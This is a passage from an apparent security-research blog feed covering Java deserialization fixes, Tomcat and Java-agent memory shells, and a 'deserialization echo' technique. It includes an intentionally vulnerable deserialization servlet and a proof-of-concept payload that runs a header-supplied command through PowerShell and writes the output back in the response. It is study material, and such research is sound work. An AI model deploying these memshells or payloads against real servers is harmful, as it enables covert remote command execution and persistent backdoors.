<code>ObjectInputStream</code> via <code>setObjectInputFilter</code> method.</li></ol><h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a><code>AnnotationInvocationHandler</code></h4><p>Recall [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|the exploitation of CC1]], there are two handlers employed, one with a dynamic proxy as <code>memberValues</code>(i.e. outer handler) and another which is a member of the proxy object with a <code>LazyMap</code> as <code>memberValues</code>(i.e. inner handler). While deserialize, it comes in a depth-prior recursion, so the inner handler would be firstly deserialized, after all fields finish deserialization here comes to deserializing the proxy, later the outer handler.<br>Let’s take a look at the <code>AnnotationInvocationHandler</code>‘s <code>readObject</code> in JDK1.8:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();  <br>  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; t = (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt;)fields.get(<span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-literal">null</span>);  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);  <br>  <br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly  </span><br>  <br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        annotationType = AnnotationType.getInstance(t);  <br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;  <br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out  </span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  <br>    &#125;  <br>  <br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();  <br>    <span class="hljs-comment">// consistent with runtime Map type  </span><br>    Map&lt;String, Object&gt; mv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();  <br>  <br>    <span class="hljs-comment">// If there are annotation members without values, that  </span><br>    <span class="hljs-comment">// situation is handled by the invoke method.    for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>        Class&lt;?&gt; memberType = memberTypes.get(name);  <br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  </span><br>            value = memberValue.getValue();  <br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||  <br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;  <br>                value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(  <br>                            objectToString(value))  <br>                    .setMember(annotationType.members().get(name));  <br>            &#125;  <br>        &#125;  <br>        mv.put(name, value);  <br>    &#125;  <br>  <br>    UnsafeAccessor.setType(<span class="hljs-built_in">this</span>, t);  <br>    UnsafeAccessor.setMemberValues(<span class="hljs-built_in">this</span>, mv);  <br>&#125;<br></code></pre></td></tr></table></figure><p>The key action falls in the local variable <code>mv</code>, now <code>readObject</code> will always set the <code>memberValue</code> to <code>LinkedHashMap</code> whatever its type deserialized. So the <code>LazyMap</code> in our CC1 would not be effective.</p><hr><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><hr><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="How-to-test-Poc-Do-not-debug"><a href="#How-to-test-Poc-Do-not-debug" class="headerlink" title="How to test Poc? Do not debug!"></a>How to test Poc? Do not debug!</h3><p>IDEA debugger could ignite the key RCE code point, which will lead to confusion like: why does calculator start even before reaching the RCE code? The picture below is an proof that the debugger would call functions of current objects.<br>![[Pasted image 20231008160842.png]]</p><hr><h2 id="Journal"><a href="#Journal" class="headerlink" title="Journal"></a>Journal</h2><ul><li><input checked="" disabled="" type="checkbox"> CC8 not worked</li></ul><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><section class="footnotes"><h2>Reference</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">Paper&#x2F;浅谈Java反序列化漏洞修复方案.md at master · Cryin&#x2F;Paper</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
      <category>JavaSec</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Memshell study, JNDI inject memshell, JNDI exploit tool development</title>
    <link href="/2023/10/ac9c8c888b5f.html"/>
    <url>/2023/10/ac9c8c888b5f.html</url>
    
    <content type="html"><![CDATA[<h1 id="Repo"><a href="#Repo" class="headerlink" title="Repo"></a>Repo</h1><p><a href="https://github.com/PadishahIII/Spring-Memshell">Spring memshell</a></p><h1 id="Tomcat-memshell"><a href="#Tomcat-memshell" class="headerlink" title="Tomcat memshell"></a>Tomcat memshell</h1><h2 id="Debug-tomcat-source-code"><a href="#Debug-tomcat-source-code" class="headerlink" title="Debug tomcat source code"></a>Debug tomcat source code</h2><p>Download source code and follow build steps from <a href="https://tomcat.apache.org/tomcat-9.0-doc/building.html#Obtain_the_Tomcat_source_code">here</a>.<br>What’s important is that <strong>you cannot debug web application and tomcat source code simultaneously</strong>, because web application should be packaged into war and you should debug it in another IDEA window.<br>The current solution is: package the web application project into the <code>output/build/webapps</code> of  tomcat source code project, and configurate the VM option of tomcat source code project with <code>-Dcatalina.home=output/build</code>. As the result, you should only run debug of tomcat source code and package web application to update code, with Hotswap option on, it seems like you are debugging a single project.</p><h2 id="Tomcat-data-flow"><a href="#Tomcat-data-flow" class="headerlink" title="Tomcat data flow"></a>Tomcat data flow</h2><h3 id="Valve-Filter-Servlet"><a href="#Valve-Filter-Servlet" class="headerlink" title="Valve, Filter, Servlet"></a>Valve, Filter, Servlet</h3><p>After <code>Connector</code> parses Http request, control will pass to <code>Container</code>‘s pipeline, begin at <code>org.apache.catalina.connector.CoyoteAdapter#service</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);<br></code></pre></td></tr></table></figure><p>Pipeline consists of several <code>Valve</code>, by default, the data flow is: <code>StandardEngineValve</code>, <code>StandardHostValve</code>, <code>StandardContextValve</code>, <code>StandardWrapperValve</code>, and in <code>StandardWrapperValve#invoke</code>, walk through <code>FilterChain</code> and finally call <code>Servlet#service</code>.</p><h2 id="Tomcat-memshell-1"><a href="#Tomcat-memshell-1" class="headerlink" title="Tomcat memshell"></a>Tomcat memshell</h2><h3 id="Valve-memshell"><a href="#Valve-memshell" class="headerlink" title="Valve memshell"></a>Valve memshell</h3><p>To dynamically create malicious Valve, we should clear out the Valve calling order.<br>The entry falls at <code>org.apache.catalina.connector.CoyoteAdapter#service</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);<br></code></pre></td></tr></table></figure><p>Then falls into <code>org.apache.catalina.core.StandardEngineValve#invoke</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHost();<br>...<br>host.getPipeline().getFirst().invoke(request, response);<br></code></pre></td></tr></table></figure><p>In <code>org.apache.catalina.core.StandardHostValve#invoke</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> request.getContext();<br>...<br>context.getPipeline().getFirst().invoke(request, response);<br></code></pre></td></tr></table></figure><p>In which <code>context</code> should be a <code>StandardContext</code>  object. Conclusively, we can use <code>StandardContext#addValve</code> to insert a malicious Valve. In addition, Valve should call next valve in the pipeline:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemshellValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>...<br>getNext().invoke(request, response);<br>&#125;<br></code></pre></td></tr></table></figure><p>After insert memshell Valve, <code>invoke</code> method will run at every single request, so you can execute command on every servlet of this context.</p><hr><h1 id="Java-Agent-memshell"><a href="#Java-Agent-memshell" class="headerlink" title="Java Agent memshell"></a>Java Agent memshell</h1><h2 id="Instrument"><a href="#Instrument" class="headerlink" title="Instrument"></a>Instrument</h2><p>Java Instrument package provide a way to add agents for a specific java method in a specific JVM. It’s similar to AOP. The type of java agent includes <code>premain</code> agent and <code>agentmain</code> agent. The <code>premain</code> agent can only be loaded at JVM start, and cannot be loaded to a already running JVM. The <code>agentmain</code> agent is able to be loaded to a running JVM dynamically, which is suited for memshell.</p><h2 id="Inject-Java-Agent"><a href="#Inject-Java-Agent" class="headerlink" title="Inject Java Agent"></a>Inject Java Agent</h2><p>To inject a java agent needs:</p><ul><li>A <code>ClassFileTransformer</code> class, in <code>transform</code> method, modify source code of target method</li><li>A class(e.g. <code>AgentMain</code>) with <code>agentmain</code> method implemented, retransform target class to spark transformer</li><li>Modify <code>MANIFEST.MF</code> of jar file to include <code>Agent-Class</code> option</li><li>With a arbitrary code execution entry, <code>attach</code> target JVM and load agent jar</li></ul><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="Cannot-use-com-sun-tools-attach-package-in-JDK8"><a href="#Cannot-use-com-sun-tools-attach-package-in-JDK8" class="headerlink" title="Cannot use com.sun.tools.attach package in JDK8"></a>Cannot use <code>com.sun.tools.attach</code> package in JDK8</h3><p>This package is supported on JDK11</p><h3 id="Cannot-use-javassist-package-on-target-server"><a href="#Cannot-use-javassist-package-on-target-server" class="headerlink" title="Cannot use javassist package on target server"></a>Cannot use <code>javassist</code> package on target server</h3><blockquote><p>[!FAIL] Not Solved<br><code>NoClassDefFoundError</code> for <code>javassist</code> classes when loading agent.<br>I intend to add jar file dynamically to ClassLoader but fail to find a way to obtain that.</p></blockquote><hr><h1 id="Deserialization-Echo-inject-memshell-via-deserialization-vuls"><a href="#Deserialization-Echo-inject-memshell-via-deserialization-vuls" class="headerlink" title="Deserialization Echo, inject memshell via deserialization vuls"></a>Deserialization Echo, inject memshell via deserialization vuls</h1><p>We can use deserialization vulnerabilities to execute arbitrary code, but can not get the execution result directly. Now that our malicious code is executed in a servlet, it is possible to obtain the Request and Response object of current servlet. Then we can either write the command execution result to response or inject a memshell into the server.</p><p>All of the work relies on the fact that we can use <code>Thread.currentThread()</code> to get a <code>TaskThread</code> whose <code>group</code> member is a reference to the <code>ThreadGroup</code> it locates in, and we can access all threads in the current thread group. We can ensure that the Request and Response object must exist in a certain thread of current thread group. So here comes a tool named <code>java-object-searcher</code> that filters objects by some conditions in current thread group, as first introduced in this article<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[半自动化挖掘request实现多种中间件回显 | 回忆飘如雪](https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/)">[2]</span></a></sup> and then this article<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Java反序列化回显学习之Tomcat通用回显 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/200930.html)">[3]</span></a></sup>.</p><h3 id="Use-java-object-searcher-to-find-Echo-class"><a href="#Use-java-object-searcher-to-find-Echo-class" class="headerlink" title="Use java-object-searcher to find Echo class"></a>Use java-object-searcher to find Echo class</h3><p>The basic usage is presented <a href="https://github.com/c0ny1/java-object-searcher">here</a>. To better look into this tool, I have copied the source code to the web project. You can also import by jar file.<br>First, we need to prepare a tomcat server vulnerable to deserialize vulnerability, e.g. <em>CommonBeanutils1</em> in <em>ysoserial</em>. Start the server in debug mode and add a break point at the <code>readObject</code> line. The servlet is as following:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/deserialize&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeserializeServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">dataStr</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;data&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (dataStr != <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-type">byte</span>[] data = decoder.decode(dataStr.toString());  <br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);  <br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);  <br>  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> objectInputStream.readObject();  <br>  <br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  <br>            res.append(String.format(<span class="hljs-string">&quot;Get object: %s&quot;</span>, obj.getClass().getName()));  <br>  <br>            resp.getWriter().println(res);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            resp.getWriter().println(<span class="hljs-string">&quot;data is empty&quot;</span>);  <br>        &#125;  <br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>        resp.getWriter().println(<span class="hljs-string">&quot;Exception:&quot;</span> + e.getClass().getName() + <span class="hljs-string">&quot;:&quot;</span> + e);  <br>    &#125;  <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Send a post request with <code>data=(any base64 content)</code> in body. While intercepted at <code>readObject</code>, push <em>Alt+F8</em> in IDEA and evaluate the following code fragment:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Keyword&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;Request&quot;</span>).build());  <br>keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;RequestInfo&quot;</span>).build());  <br>keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;RequestGroup&quot;</span>).build());  <br>keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;RequestGroupInfo&quot;</span>).build());  <br>keys.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Keyword</span>.Builder().setField_type(<span class="hljs-string">&quot;ServletRequest&quot;</span>).build());  <br>  <br><span class="hljs-type">SearchRequstByBFS</span> <span class="hljs-variable">searcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequstByBFS</span>(Thread.currentThread(), keys);  <br>searcher.setIs_debug(<span class="hljs-literal">false</span>);  <br>searcher.setMax_search_depth(<span class="hljs-number">20</span>);  <br>searcher.setReport_save_path(<span class="hljs-string">&quot;D:\\Files\\Java_WorkSpace\\Webapp-for-tomcat9\\webapp-for-tomcat9&quot;</span>);  <br>searcher.searchObject();<br></code></pre></td></tr></table></figure><p>After done without any exception, we can find the result in folder:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs clean">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125;   <br>  ---&gt; group = &#123;java.lang.ThreadGroup&#125;   <br>   ---&gt; threads = &#123;<span class="hljs-keyword">class</span> [Ljava.lang.Thread;&#125;   <br>    ---&gt; [<span class="hljs-number">3</span>] = &#123;java.lang.Thread&#125;   <br>     ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125;   <br>      ---&gt; this$<span class="hljs-number">0</span> = &#123;org.apache.tomcat.util.net.NioEndpoint&#125;   <br>        ---&gt; handler = &#123;org.apache.coyote.AbstractProtocol$ConnectionHandler&#125;   <br>         ---&gt; global = &#123;org.apache.coyote.RequestGroupInfo&#125;<br><br>TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125;   <br>  ---&gt; group = &#123;java.lang.ThreadGroup&#125;   <br>   ---&gt; threads = &#123;<span class="hljs-keyword">class</span> [Ljava.lang.Thread;&#125;   <br>    ---&gt; [<span class="hljs-number">3</span>] = &#123;java.lang.Thread&#125;   <br>     ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125;   <br>      ---&gt; this$<span class="hljs-number">0</span> = &#123;org.apache.tomcat.util.net.NioEndpoint&#125;   <br>        ---&gt; handler = &#123;org.apache.coyote.AbstractProtocol$ConnectionHandler&#125;   <br>         ---&gt; global = &#123;org.apache.coyote.RequestGroupInfo&#125;   <br>          ---&gt; processors = &#123;java.util.ArrayList&lt;org.apache.coyote.RequestInfo&gt;&#125;   <br>           ---&gt; [<span class="hljs-number">0</span>] = &#123;org.apache.coyote.RequestInfo&#125;<br>...<br><br></code></pre></td></tr></table></figure><p>The <code>TargetObject</code> of each chain is the start point for searching. Every line presents a member of parent. And in the last row we can find the target class.<br>Next I will reproduce the first chain as above to get the echo from deserialization vul.</p><h3 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h3><p>Let’s put concepts into practice. I have prepared a Tomcat server vulnerable to [[Java Deserialize Vulnerabilities ysoserial study#CommonsBeanutils|CB1]]. I will write an evil class to perform according to the first echo chain as above to execute arbitrary command and write the result to response.<br>Take a recall to CB1, which uses <code>TemplatesImpl</code> as sink, so our evil class named <code>TomcatEchoPayload</code> should extend <code>AbstractTranslet</code> class and write main code in its constructor:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.<span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> java.lang.Thread.currentThread();  <br>java.lang.<span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> thread.getThreadGroup();  <br>java.lang.Thread[] threads = (java.lang.Thread[]) TomcatEchoPayload.getFieldValue(threadGroup, <span class="hljs-string">&quot;threads&quot;</span>);  <br>  <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; threads.length; i++) &#123;  <br>    java.lang.<span class="hljs-type">Thread</span> <span class="hljs-variable">th</span> <span class="hljs-operator">=</span> threads[i];  <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> TomcatEchoPayload.getFieldValue(th, <span class="hljs-string">&quot;target&quot;</span>);  <br>    <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> Runnable) &#123;<span class="hljs-comment">//TomcatEchoPayload.classNameEndWith(target, &quot;NioEndpoint$Poller&quot;)  </span><br>        java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> TomcatEchoPayload.getFieldValue(target, <span class="hljs-string">&quot;this$0&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (TomcatEchoPayload.classNameContains(o, <span class="hljs-string">&quot;NioEndpoint&quot;</span>)) &#123;  <br>            java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> TomcatEchoPayload.getFieldValue(o, <span class="hljs-string">&quot;handler&quot;</span>);  <br>            java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> TomcatEchoPayload.getFieldValue(handler, <span class="hljs-string">&quot;global&quot;</span>);  <br>            <span class="hljs-keyword">if</span> (TomcatEchoPayload.classNameContains(global, <span class="hljs-string">&quot;RequestGroupInfo&quot;</span>)) &#123;  <br>                java.util.List&lt;org.apache.coyote.Request&gt; requests = TomcatEchoPayload.getRequests((org.apache.coyote.RequestGroupInfo) global);  <br>                <span class="hljs-keyword">if</span> (handleRequests(requests)) &#123;  <br>                    <span class="hljs-keyword">break</span>;  <br>                &#125;  <br>  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Now that we have obtained the <code>Request</code> object, let’s write function to run command and reply in response:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(org.apache.coyote.Request request)</span> &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        org.apache.coyote.<span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> request.getResponse();  <br>        java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;cmd&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.length() &lt;= <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>        &#125;  <br>        <span class="hljs-type">byte</span>[] res = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>((<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;powershell.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, cmd&#125;)).start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next().getBytes();  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">byteChunkCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">byteChunk</span> <span class="hljs-operator">=</span> byteChunkCls.newInstance();  <br>        byteChunk.getClass().getDeclaredMethod(<span class="hljs-string">&quot;setBytes&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class).invoke(byteChunk, res, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">0</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(res.length));  <br>        response.setStatus(<span class="hljs-number">200</span>);  <br>        response.addHeader(<span class="hljs-string">&quot;TomcatEcho&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, StandardCharsets.UTF_8));  <br>        response.getClass().getDeclaredMethod(<span class="hljs-string">&quot;doWrite&quot;</span>, byteChunkCls).invoke(response, byteChunk);  <br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br><br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>Compile the <code>TomcatEchoPayload</code> class and get the byte code, we can use <code>ClassFiles</code> class in ysuserial:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassFiles.classAsBytes(TomcatEchoPayload.class);<br></code></pre></td></tr></table></figure><p>Build CB1 gadget:</p><figure class="highlight 